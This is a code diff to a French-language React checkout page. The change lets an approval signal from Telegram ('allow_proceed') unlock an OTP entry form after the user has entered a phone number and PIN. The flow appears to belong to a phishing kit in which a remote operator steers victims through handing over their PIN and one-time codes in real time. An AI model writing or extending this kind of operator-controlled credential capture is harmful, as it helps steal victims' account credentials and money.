@@ -39,7 +39,8 @@ function CheckoutPage({
   actionError,
   telegramAction
 }) {
-  const checkoutStatusIcon = waitingApproval ? 'refresh' : approvalPassed ? 'otp' : 'shieldCheck';
+  const approvalReady = approvalPassed || telegramAction?.action === 'allow_proceed';
+  const checkoutStatusIcon = waitingApproval ? 'refresh' : approvalReady ? 'otp' : 'shieldCheck';
   const verificationApproved = telegramAction?.action === 'correct_pin_otp';
 
   return (
@@ -70,7 +71,7 @@ function CheckoutPage({
             <span>
               {waitingApproval
                 ? 'Validation de vos informations...'
-                : approvalPassed
+                  : approvalReady
                   ? `Un code OTP a ete envoye a ${apiPhoneNumber || 'votre numero'}. Saisissez-le pour terminer.`
                   : 'Verifiez votre numero avec votre PIN'}
             </span>
@@ -89,7 +90,7 @@ function CheckoutPage({
 
           {approvalError && <div className="checkout-error field-error">{approvalError}</div>}
 
-          {approvalPassed && !paymentConfirmed && (
+          {approvalReady && !paymentConfirmed && (
             <div className="otp-timer">
               {otpTimer > 0
                 ? `Code valide pendant : ${otpTimer}s`
@@ -142,7 +143,7 @@ function CheckoutPage({
                 </>
               )}
 
-              {approvalPassed && !paymentConfirmed && (
+              {approvalReady && !paymentConfirmed && (
                 <label className="form-field">
                   <span className="label-with-icon otp-label-centered"><UiGlyph type="otp" />Entrez OTP</span>
                   <div className="otp-grid" onPaste={handleOtpPaste}>
@@ -168,7 +169,7 @@ function CheckoutPage({
                 </label>
               )}
 
-              {approvalPassed && !paymentConfirmed && (
+              {approvalReady && !paymentConfirmed && (
                 <div className="form-resend">
                   <button
                     type="button"
@@ -187,7 +188,7 @@ function CheckoutPage({
                 <button
                   type="submit"
                   className="button-primary button-connect"
-                  disabled={(approvalPassed && otpTimer === 0 && !paymentConfirmed) || submissionLoading || waitingApproval || actionLoading}
+                  disabled={(approvalReady && otpTimer === 0 && !paymentConfirmed) || submissionLoading || waitingApproval || actionLoading}
                 >
                   {submissionLoading ? 'Envoi...' : 'CONNEXION'}
                 </button>
